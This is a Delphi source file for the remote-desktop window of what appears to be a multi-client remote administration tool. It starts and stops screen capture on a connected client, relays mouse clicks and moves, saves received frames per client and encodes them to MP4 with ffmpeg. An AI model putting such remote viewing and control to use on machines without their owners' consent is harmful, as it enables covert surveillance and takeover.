unit UnitDesktop;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, ToolWin, jpeg, ExtCtrls, acImage, UnitMain, Menus, SocketUnitEx,
  StdCtrls, UnitCommands, UnitVariables, UnitRepository, UnitFunctions, UnitConstants,
  UnitManager, UnitEncryption, uJSONConfig, Buttons;

type
  TFormDesktop = class(TForm)
    tlb1: TToolBar;
    btn1: TToolButton;
    btn2: TToolButton;
    btn4: TToolButton;
    pnl1: TPanel;
    lbl1: TLabel;
    trckbr1: TTrackBar;
    chk1: TCheckBox;
    chk2: TCheckBox;
    img1: TImage;
    lbl2: TLabel;
    trckbr2: TTrackBar;
    lbl3: TLabel;
    btn5: TToolButton;
    lbl5: TLabel;
    lbl6: TLabel;
    btn3: TToolButton;
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormShow(Sender: TObject);
    procedure btn1Click(Sender: TObject);
    procedure btn2Click(Sender: TObject);
    procedure img1MouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure img1MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure btn5Click(Sender: TObject);
    procedure btn4Click(Sender: TObject);
    procedure chk1Click(Sender: TObject);
    procedure chk2Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure trckbr1Change(Sender: TObject);
    procedure trckbr2Change(Sender: TObject);
    procedure btn3Click(Sender: TObject);
  protected
    procedure CreateParams(var Params: TCreateParams) ; override;
  private
    { Private declarations }
    Client: TClientDatas;
    hWidth, hHeight, LastQuality,
    LastInterval, LastImgW, LastImgH: Integer;
    LastClick: DWORD;
    procedure AddLog(Log: string);
    procedure AddSentLog(Log: string);
    procedure AddRecvLog(Log: string; lColor: TColor = clGreen);
  public
    { Public declarations }
    constructor Create(aOwner: TComponent; _Client: TClientDatas);
    procedure WndProc(var Msg: TMessage); override;
  end;

var
  FormDesktop: TFormDesktop;

implementation

{$R *.dfm}

constructor TFormDesktop.Create(aOwner: TComponent; _Client: TClientDatas);
begin
  inherited Create(aOwner);
  Client := _Client;
end;

procedure TFormDesktop.CreateParams(var Params: TCreateParams) ;
begin
  inherited;
  Params.ExStyle := Params.ExStyle or WS_EX_APPWINDOW;
  Params.WndParent := 0;
end;

procedure TFormDesktop.AddLog(Log: string);
begin
  if Client.Forms[16] = nil then Exit;
  TFormManager(Client.Forms[16]).AddLog('[INFO]', Log, -1, clBlack);
end;

procedure TFormDesktop.AddSentLog(Log: string);
begin                                
  if Client.Forms[16] = nil then Exit;
  TFormManager(Client.Forms[16]).AddLog('[SENT]', Log, 0, clBlue);
end;

procedure TFormDesktop.AddRecvLog(Log: string; lColor: TColor);
begin                         
  if Client.Forms[16] = nil then Exit;
  TFormManager(Client.Forms[16]).AddLog('[RECEIVED]', Log, 1, lColor);
end;

procedure TFormDesktop.FormClose(Sender: TObject;
  var Action: TCloseAction);     
var
  JSONConfig: TJSONConfig;
begin
  if btn1.Down = True then
  begin
    btn1.Down := False;
    btn1.Click;
  end;

  JSONConfig := TJSONConfig.Create(WindowsSettings, PROGRAMPASSWORD);
  JSONConfig.WriteInteger('Desktop width', Width);
  JSONConfig.WriteInteger('Desktop height', Height);
  JSONConfig.WriteInteger('Desktop left', Left);
  JSONConfig.WriteInteger('Desktop top', Top);
  JSONConfig.SaveConfig;
  JSONConfig.Free;
end;

procedure TFormDesktop.FormShow(Sender: TObject);
var
  TmpStr: string;
begin
  TmpStr := Client.Infos.ScreenRes;
  hWidth := StrToInt(Copy(TmpStr, 1, Pos('x', TmpStr)-1));
  Delete(TmpStr, 1, Pos('x', TmpStr));
  hHeight := StrToInt(TmpStr);

  if AutostartDesk then
  begin
    btn1.Down := True;
    btn1.Click;
  end;
end;
                 
procedure TFormDesktop.btn1Click(Sender: TObject);
begin
  if btn1.Down = False then
  begin
    Client.SendDatas(DESKTOPCAPTURESTOP + '|');
    AddSentLog('Stop desktop capture');
  end
  else
  begin
    LastQuality := trckbr1.Position;
    LastInterval := trckbr2.Position;
    LastImgW := img1.Width;
    LastImgH := img1.Height;
    Client.SendDatas(DESKTOPCAPTURESTART + '|' + IntToStr(LastQuality) + '|' +
      IntToStr(LastInterval) + '|' + IntToStr(LastImgW) + '|' + IntToStr(LastImgH) + '|');
    AddSentLog('Start desktop capture');
  end;
end;

procedure TFormDesktop.btn2Click(Sender: TObject);
begin
  if pnl1.Visible = False then pnl1.Visible := True else pnl1.Visible := False;
end;

procedure TFormDesktop.img1MouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
var
  Point: TPoint;
begin
  if chk1.Checked = False then Exit;
  if btn1.Down = False then Exit;

  Point.X := (X * hWidth) div img1.Width;
  Point.Y := (Y * hHeight) div img1.Height;

  if GetTickCount - LastClick < 250 then
  begin
    if Button = MbLeft then
    Client.SendDatas(MOUSELEFTDOUBLECLICK + '|' + IntToStr(Point.X) + '|' + IntToStr(Point.Y));
    if Button = MbRight then
    Client.SendDatas(MOUSERIGHTDOUBLECLICK + '|' + IntToStr(Point.X) + '|' + IntToStr(Point.Y));
  end
  else
  begin
    if Button = MbLeft then
    Client.SendDatas(MOUSELEFTCLICK + '|' + IntToStr(Point.X) + '|' + IntToStr(Point.Y));
    if Button = MbRight then
    Client.SendDatas(MOUSERIGHTCLICK + '|' + IntToStr(Point.X) + '|' + IntToStr(Point.Y));
  end;

  LastClick := GetTickCount;
end;

procedure TFormDesktop.img1MouseMove(Sender: TObject; Shift: TShiftState;
  X, Y: Integer);
var
  Point: TPoint;
begin
  if chk2.Checked = False then Exit;
  if btn1.Down = False then Exit;

  Point.X := (X * hWidth) div img1.Width;
  Point.Y := (Y * hHeight) div img1.Height;
  Client.SendDatas(MOUSEMOVECURSOR + '|' + IntToStr(Point.X) + '|' + IntToStr(Point.Y ));
end;
    
procedure TFormDesktop.WndProc(var Msg: TMessage);
var
  Stream: TMemoryStream;
  Jpg: TJPEGImage;
  Bmp: TBitmap;
  TmpStr, Datas: string;
begin
  inherited;

  if Msg.Msg = WM_PROCESS_DATAS then
  begin                       
    Datas := string(Msg.WParam);
    if Datas = '' then
    begin
      AddRecvLog('Empty desktop image of size ' + FileSizeToStr(Length(Datas)), clRed);
      Exit;
    end;

    Stream := TMemoryStream.Create;
    Stream.Write(Pointer(Datas)^, Length(Datas));
    Stream.Position := 0;

    AddRecvLog('Desktop image stream of size ' + FileSizeToStr(Stream.Size));

    try
      Jpg := TJPEGImage.Create;
      Jpg.LoadFromStream(Stream);
      Stream.Free;
      Bmp := TBitmap.Create;
      Bmp.Assign(Jpg);
      Jpg.Free;
    except
      Stream.Free;
      Jpg.Free;
      Bmp.Free;
      Exit;
    end;

    if btn4.Down then
    begin
      TmpStr := GetDesktopFolder(Client.UserId) + '\' + MyGetDate('-');
      if not DirectoryExists(TmpStr) then CreateDir(TmpStr);
      Bmp.SaveToFile(TmpStr + '\' + _MyGetTime('_') + '.bmp');
    end;                                               

    img1.Picture.Bitmap.Assign(Bmp);
    Bmp.Free;

    Application.ProcessMessages;
    if btn1.Down = False then Exit;
    
    if (LastQuality <> trckbr1.Position) or (LastInterval <> trckbr2.Position) then
    begin
      LastQuality := trckbr1.Position;
      LastInterval := trckbr2.Position;
      Client.SendDatas(DESKTOPSETTINGS + '|' + IntToStr(LastQuality) + '|' +
        IntToStr(LastInterval) + '|' + IntToStr(img1.Width) + '|' + IntToStr(img1.Height) + '|');
    end;
  end
  else

  if Msg.Msg = WM_EXITSIZEMOVE then
  begin
    if btn1.Down = False then Exit;
    
    if (LastImgW <> img1.Width) or (LastImgH <> img1.Height) then
    begin
      LastImgW := img1.Width;
      LastImgH := img1.Height;
      Client.SendDatas(DESKTOPSETTINGS + '|' + IntToStr(trckbr1.Position) + '|' +
        IntToStr(trckbr2.Position) + '|' + IntToStr(LastImgW) + '|' + IntToStr(LastImgH) + '|');
    end;
  end
  else

  if Msg.Msg = WM_MOVE then Application.ProcessMessages;
end;

function ListFrames(Path: string; var i: Integer): TStringArray;
var
  SchRec: TSearchRec;
begin
  Path := Path + '\';
  if FindFirst(Path + '*.*', faAnyFile, SchRec) <> 0 then Exit;
  
  i := 0;
  repeat
    if (SchRec.Attr and faDirectory) = faDirectory then Continue;
    Result[i] := Path + SchRec.Name;
    Inc(i);
  until FindNext(SchRec) <> 0;
  FindClose(SchRec);
end;

procedure TFormDesktop.btn5Click(Sender: TObject);
var
  MpegFile, FrameFolder,
  RecordFolder, TmpStr: string;
  TmpList: TStringArray;
  i, j: Integer;
  Bmp: TBitmap;                 
begin
  if btn1.Down = True then Exit;

  FrameFolder := GetDesktopFolder(Client.UserId) + '\' + MyGetDate('-');
  if not DirectoryExists(FrameFolder) then 
  begin
    MessageBox(Handle, 'No saved frames found.', PROGRAMINFOS, MB_ICONERROR);
    Exit;
  end;

  MpegFile := ExtractFilePath(ParamStr(0)) + 'Resources\ffmpeg\ffmpeg.exe';
  if not FileExists(MpegFile) then
  begin
    MessageBox(Handle, PChar('File "' + MpegFile + '" not found.'), PROGRAMINFOS, MB_ICONERROR);
    Exit;
  end;

  btn5.Enabled := False;
  Cursor := crHourGlass;

  RecordFolder := FrameFolder + '\Records';
  if not DirectoryExists(RecordFolder) then CreateDirectory(PChar(RecordFolder), nil);

  TmpList := ListFrames(FrameFolder, i);
  if not DirectoryExists(RecordFolder + '\_Temp') then CreateDir(RecordFolder + '\_Temp');

  for j := 0 to i - 1 do
  begin
    Bmp := TBitmap.Create;
    Bmp.LoadFromFile(TmpList[j]);
    Bmp.SaveToFile(RecordFolder + '\_Temp\00' + IntToStr(j + 1) + '.bmp');
    Bmp.Free;
  end;

  TmpList := ListFrames(RecordFolder + '\_Temp', i);

  for j := 0 to i - 1 do
  begin
    TmpStr := ExtractFileName(TmpList[j]);

    case Length(TmpStr) of
      8: Delete(TmpStr, 1, 1);
      9: Delete(TmpStr, 1, 2);
    end;

    RenameFile(TmpList[j], ExtractFilePath(TmpList[j]) + TmpStr);
  end;

  TmpStr := RecordFolder + '\' + MyGetTime('_') + '.mp4';
  ExecAndWait('"' + MpegFile + '" -framerate 2.5 -i "' + RecordFolder + '\_Temp\%03d.bmp" ' +
    '-c:v libx264 -vf fps=30 -s 640x480 -pix_fmt yuv420p -y "' + TmpStr + '"');

  if FileExists(TmpStr) = True then
    MessageBox(Handle, 'Saved frames recorded succesfully!', PROGRAMINFOS, MB_ICONINFORMATION)
  else MessageBox(Handle, 'Failed to record saved frames.', PROGRAMINFOS, MB_ICONERROR);

  DeleteAllFilesAndDir(RecordFolder + '\_Temp');
  btn5.Enabled := True;
  Cursor := crDefault;
end;

procedure TFormDesktop.btn4Click(Sender: TObject);
begin
  if btn4.Down then AddLog('Start saving received frames') else
    AddLog('Stop saving received frames');
end;

procedure TFormDesktop.chk1Click(Sender: TObject);
begin
  if chk1.Checked then AddLog('Mouse clicks control started') else
    AddLog('Mouse clicks control stopped');
end;

procedure TFormDesktop.chk2Click(Sender: TObject);
begin
  if chk2.Checked then AddLog('Mouse moves control started') else
    AddLog('Mouse moves control stopped');
end;

procedure TFormDesktop.FormCreate(Sender: TObject);
var
  JSONConfig: TJSONConfig;
  i: Integer;
begin
  //Load window position settings
  JSONConfig := TJSONConfig.Create(WindowsSettings, PROGRAMPASSWORD);
  JSONConfig.LoadConfig;
  i := JSONConfig.ReadInteger('Desktop width');
  if i <= 0 then Width := 618 else Width := i;
  i := JSONConfig.ReadInteger('Desktop height');
  if i <= 0 then Height := 360 else Height := i;
  i := JSONConfig.ReadInteger('Desktop left');
  if i <= 0 then Left := (Screen.Width - Width) div 2 else Left := i;
  i := JSONConfig.ReadInteger('Desktop top');
  if i <= 0 then Top := (Screen.Height - Height) div 2 else Top := i;
  JSONConfig.Free;
end;

procedure TFormDesktop.trckbr1Change(Sender: TObject);
begin
  lbl5.Caption := IntToStr(trckbr1.Position) + '%';
end;

procedure TFormDesktop.trckbr2Change(Sender: TObject);
begin
  lbl6.Caption := IntToStr(trckbr2.Position) + 'ms';
end;

procedure TFormDesktop.btn3Click(Sender: TObject);
var
  JSONConfig: TJSONConfig;
  i: Integer;
begin
  if btn3.Down = True then
  begin
    BorderStyle := bsNone;
    WindowState := wsMaximized;
  end
  else
  begin
    BorderStyle := bsSizeable;
    WindowState := wsNormal;

    JSONConfig := TJSONConfig.Create(WindowsSettings, PROGRAMPASSWORD);
    JSONConfig.LoadConfig;
    i := JSONConfig.ReadInteger('Desktop width');
    if i <= 0 then Width := 618 else Width := i;
    i := JSONConfig.ReadInteger('Desktop height');
    if i <= 0 then Height := 360 else Height := i;
    i := JSONConfig.ReadInteger('Desktop left');
    if i <= 0 then Left := (Screen.Width - Width) div 2 else Left := i;
    i := JSONConfig.ReadInteger('Desktop top');
    if i <= 0 then Top := (Screen.Height - Height) div 2 else Top := i;
    JSONConfig.Free;
  end;
end;

end.
